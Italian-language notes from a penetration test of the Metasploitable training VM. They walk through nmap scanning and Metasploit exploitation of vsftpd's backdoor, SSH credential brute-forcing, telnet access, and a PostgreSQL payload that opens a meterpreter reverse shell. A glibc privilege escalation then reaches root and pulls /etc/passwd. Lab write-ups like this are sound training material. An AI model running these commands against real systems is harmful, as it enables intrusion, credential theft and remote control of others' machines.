Metasploitable - pentest infrastrutturale

Inizio con una scansione di tutta la rete
	nmap -sS 192.168.236.1-254

nmap mi risponde cosi'
	Nmap scan report for 192.168.236.139
	Host is up (0.00073s latency).
	Not shown: 977 closed ports
	PORT     STATE SERVICE
	21/tcp   open  ftp
	22/tcp   open  ssh
	23/tcp   open  telnet
	25/tcp   open  smtp
	53/tcp   open  domain
	80/tcp   open  http
	111/tcp  open  rpcbind
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	512/tcp  open  exec
	513/tcp  open  login
	514/tcp  open  shell
	1099/tcp open  rmiregistry
	1524/tcp open  ingreslock
	2049/tcp open  nfs
	2121/tcp open  ccproxy-ftp
	3306/tcp open  mysql
	5432/tcp open  postgresql
	5900/tcp open  vnc
	6000/tcp open  X11
	6667/tcp open  irc
	8009/tcp open  ajp13
	8180/tcp open  unknown

***21/tcp   open  ftp***
	Trovato l'IP con le porte aperte, comincio con il server ftp:
		nmap -sV 192.168.236.139 -p 21
			l'opzione -sV mi serve per fare il banner grubing.
			l'opzione -p 21 indica la porta 21 a nmap

	nmap mi risponde in questo modo:
		PORT   STATE SERVICE VERSION
		21/tcp open  ftp     vsftpd 2.3.4

	A questo punto, apro metasploit e vedo di capire se esiste un exploit per la versione dell'ftp server. Digito:
		search vsftpd

	msf mi risponde
		exploit/unix/ftp/vsftpd_234_backdoor
		(https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor)

	Comincio a settare l'exploit:
		use exploit/unix/ftp/vsftpd_234_backdoor
		set RHOST 192.168.236.139
		***la porta lascio ovviamente la 21***
		exploit
		***sono dentro***
		id -> root
		reboot

***22/tcp   open  ssh***
	nmap -sV 192.168.236.139 -p 22

	namp risponde cosi'
		PORT   STATE SERVICE VERSION
		22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

	Apro metasploit (msfconsole) e cerco l'exploit per la versione del servizio ssh.
		search ssh
		scelgo ssh login

	msf mi risponde
		use auxiliary/scanner/ssh/ssh_login
		(https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules)
			questo tipo di exploit ha bisogno di un file wordlist username password.
			Si puo' utilizzare quello presente sotto /usr/share/metasploit-framework/data/wordlists/root_userpass.txt

	Comincio a settare l'exploit:
		use auxiliary/scanner/ssh/ssh_login
		set RHOSTS 192.168.236.139
		set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
		set VERBOSE true
		exploit

	La risposta di msf e':
		[-] 192.168.236.139:22 - Failed: 'root:vagrant'
		[+] 192.168.236.139:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '

	Dato che ha trovato una sessione con successo, provo a sfruttare la sessione che ha avuto successo. Digito:
		sessions -i
			e vedo l'id di sessione
			Id  Name  Type         Information                                 Connection
			--  ----  ----         -----------                                 ----------
  			1         shell linux  SSH msfadmin:msfadmin (192.168.236.139:22)  192.168.236.1:38603 -> 192.168.236.139:22 (192.168.236.139)

  		sessions -i 1

  		[*] Starting interaction with 1...
		ls
		vulnerable
		id
		uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
		uname -a
		Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

	Volendo proseguire, si potrebbe fare priviledge escalation.

***23/tcp   open  telnet***
	Trovato l'IP con le porte aperte, comincio con il server ftp:
		nmap -sV 192.168.236.139 -p 23

	nmap mi risponde in questo modo:
		PORT   STATE SERVICE VERSION
		23/tcp open  telnet  Linux telnetd


	A questo punto, usando il terminale mi connetto in telnet all'IP
		telnet 192.168.236.139

	Telnet risponde mostrandomi le credenziali di accesso. In altri casi, si potrebbe tentare un bruteforce con hydra.


***5432/tcp***
	PORT     STATE SERVICE    VERSION
	5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7

	msfconsole
		search postgresql
		msf5 > use exploit/linux/postgres/postgres_payload
		msf5 exploit(linux/postgres/postgres_payload) > show options
		sf5 exploit(linux/postgres/postgres_payload) > set payload linux/x86/meterpreter/reverse_tcp
		payload => linux/x86/meterpreter/reverse_tcp
		msf5 exploit(linux/postgres/postgres_payload) > show options

		msf5 exploit(linux/postgres/postgres_payload) > set RHOSTS 192.168.236.139
		RHOSTS => 192.168.236.139
		msf5 exploit(linux/postgres/postgres_payload) > set LHOST 192.168.236.1
		LHOST => 192.168.236.1
		msf5 exploit(linux/postgres/postgres_payload) > exploit
		msf5 exploit(linux/postgres/postgres_payload) > use exploit/linux/postgres/postgres_payload
		msf5 exploit(linux/postgres/postgres_payload) > show targets
		msf5 exploit(linux/postgres/postgres_payload) > set TARGET 0
		TARGET => 0
		msf5 exploit(linux/postgres/postgres_payload) > show options
		msf5 exploit(linux/postgres/postgres_payload) > exploit
		meterpreter > getuid
		Server username: uid=108, gid=117, euid=108, egid=117
		msf5 exploit(linux/postgres/postgres_payload) > use post/multi/recon/local_exploit_suggester
		msf5 post(multi/recon/local_exploit_suggester) > sessions
		msf5 post(multi/recon/local_exploit_suggester) > set SESSION 3
		SESSION => 3
		msf5 post(multi/recon/local_exploit_suggester) > show options
		msf5 post(multi/recon/local_exploit_suggester) > set showdescription true
		showdescription => true
		msf5 post(multi/recon/local_exploit_suggester) > run

			[*] 192.168.236.139 - Collecting local exploits for x86/linux...
			[*] 192.168.236.139 - 25 exploit checks are being tried...
			[+] 192.168.236.139 - exploit/linux/local/glibc_ld_audit_dso_load_priv_esc: The target appears to be vulnerable.
			  This module attempts to gain root privileges on Linux systems by abusing a vulnerability in the GNU C Library (glibc) dynamic linker. glibc ld.so in versions before 2.11.3, and 2.12.x before 2.12.2 does not properly restrict use of the LD_AUDIT environment variable when loading setuid executables. This allows loading arbitrary shared objects from the trusted library search path with the privileges of
			  the suid user. This module uses LD_AUDIT to load the libpcprofile.so shared object, distributed with some versions of glibc, and
			  leverages arbitrary file creation functionality in the library constructor to write a root-owned world-writable file to a system
			  trusted search path (usually /lib). The file is then overwritten with a shared object then loaded with LD_AUDIT resulting in
			  arbitrary code execution. This module has been tested successfully on glibc version 2.11.1 on Ubuntu 10.04 x86_64 and version 2.7 on
			  Debian 5.0.4 i386. RHEL 5 is reportedly affected, but untested. Some glibc distributions do not contain the libpcprofile.so library required for successful exploitation.
			[+] 192.168.236.139 - exploit/linux/local/glibc_origin_expansion_priv_esc: The target appears to be vulnerable.
			  This module attempts to gain root privileges on Linux systems by abusing a vulnerability in the GNU C Library (glibc) dynamic linker. glibc ld.so in versions before 2.11.3, and 2.12.x before 2.12.2 does not properly restrict use of the LD_AUDIT environment variable when loading setuid executables which allows control over the $ORIGIN library search path resulting in execution of arbitrary shared objects. This module opens a file descriptor to the specified suid executable via a hard link, then replaces the hard link with a shared object before instructing the linker to execute the file descriptor, resulting in arbitrary code execution. The specified setuid binary must be readable and located on the same file system partition as the specified writable directory. This module has been tested successfully on glibc version 2.5 on CentOS 5.4 (x86_64), 2.5 on CentOS 5.5 (x86_64) and 2.12 on Fedora 13 (i386). RHEL 5 is reportedly affected, but untested. Some versions of ld.so, such as the version shipped with Ubuntu 14, hit a failed assertion in dl_open_worker causing exploitation to fail.
			[+] 192.168.236.139 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.
			  This module attempts to exploit a netfilter bug on Linux Kernels before 4.6.3, and currently only works against Ubuntu 16.04 (not
			  16.04.1) with kernel 4.4.0-21-generic. Several conditions have to be met for successful exploitation: Ubuntu: 1. ip_tables.ko (ubuntu),
			  iptable_raw (fedora) has to be loaded (root running iptables -L will do such) 2. libc6-dev-i386 (ubuntu), glibc-devel.i686 & libgcc.i686
			  (fedora) needs to be installed to compile Kernel 4.4.0-31-generic and newer are not vulnerable. We write the ascii files and compile
			  on target instead of locally since metasm bombs for not having cdefs.h (even if locally installed)
			[*] Post module execution completed
			msf5 post(multi/recon/local_exploit_suggester) > set exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
			[-] Unknown variable
			Usage: set [option] [value]

			Set the given option to value.  If value is omitted, print the current value.
			If both are omitted, print options that are currently set.

			If run from a module context, this will set the value in the module's
			datastore.  Use -g to operate on the global datastore
		msf5 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
		msf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > show options
		msf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > set session 3
		session => 3
		msf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > show options
		msf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > run

		[*] Started reverse TCP handler on 192.168.1.32:4444
		[+] The target appears to be vulnerable
		[*] Using target: Linux x86
		[*] Writing '/tmp/.SIUnCqNt' (1279 bytes) ...
		[*] Writing '/tmp/.J3wfyDd' (286 bytes) ...
		[*] Writing '/tmp/.ISICLBfL8F' (207 bytes) ...
		[*] Launching exploit...
		[*] Sending stage (985320 bytes) to 192.168.1.32
		[*] Meterpreter session 4 opened (192.168.1.32:4444 -> 192.168.1.32:37493) at 2019-02-09 17:44:57 +0100

		meterpreter > getuid
		Server username: uid=0, gid=0, euid=0, egid=0
		meterpreter > download /etc/passwd


	https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload
https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester